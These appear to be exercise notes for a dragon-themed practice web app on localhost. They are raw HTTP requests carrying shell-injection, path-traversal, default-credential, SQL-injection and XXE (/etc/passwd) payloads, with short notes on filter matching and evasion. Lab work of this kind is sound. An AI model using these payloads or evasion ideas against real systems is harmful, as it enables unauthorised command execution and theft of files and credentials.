# Shell injection 1 (detect-dragon ip=)

```
    POST /detect-dragon.php HTTP/1.1
    Host: localhost
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 38

    ip=1.2.3.4;cat /app/dragon-detector-ai
```

1. Missed injection symbol (`&`)
2. urldecode
3. GET vs POST arguments

# Path Traversal 1 (url)

```
    GET /../../../app/server.rb HTTP/1.1
    Host: localhost
```

1. Path normalization (`/./`, `//`, etc)
2. HTML encoding

# Default login

```
    GET /avert-disaster.php HTTP/1.1
    Host: localhost
    Authorization: basic YWRtaW46YWRtaW4
```

1. Normalized headers
2. Ambiguous base64

# Path Traversal 2 (image)

```
    GET /picture.php?file=../../../../../../../var/www/html/picture.php HTTP/1.1
    Host: localhost
```

1. GET vs POST
2. URL encoding

# SQL injection 1 (login bypass)

```
    POST / HTTP/1.1
    Host: localhost
    Content-Length: 21
    Content-Type: application/x-www-form-urlencoded

    passphrase='or '1'='1
```

1. Matching spaces
2. Matching a payload

# SQL injection 2 (fetch data)

```
    GET /?search=')+or+'1'='1'-- HTTP/1.1
    Host: localhost
```



# Shell injection 2 (JSON)

```
    POST /backend.php HTTP/1.1
    Host: localhost
    Connection: close
    Content-Type: application/json
    Content-Length: 113

    {
      "hoardType": "artifact",
      "gold": "10';cat /app/valuate-hoard;echo '",
      "gems": "20",
      "artifacts": "30"
    }
```

1. JSON newline madness


# XXE

```
    POST / HTTP/1.1
    Host: localhost
    Connection: keep-alive
    Content-Length: 376
    Content-Type: multipart/form-data; boundary=----WebKitFormBoundarybBYvkB2ohiOQdWxB

    ------WebKitFormBoundarybBYvkB2ohiOQdWxB
    Content-Disposition: form-data; name="dragon_file"; filename="dragons.xml"
    Content-Type: text/xml

    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE root [
      <!ENTITY xxe SYSTEM "file:///etc/passwd">
    ]>
    <dragons>
      <dragon>
        <name>Smaug</name>
        <proof>&xxe;</proof>
      </dragon>
    </dragons>

    ------WebKitFormBoundarybBYvkB2ohiOQdWxB--
```

1. Matching WebKitFormBoundary
2. Matching filename .xml
3. Matching the XML part
4. Can I find another way to exploit XXE?
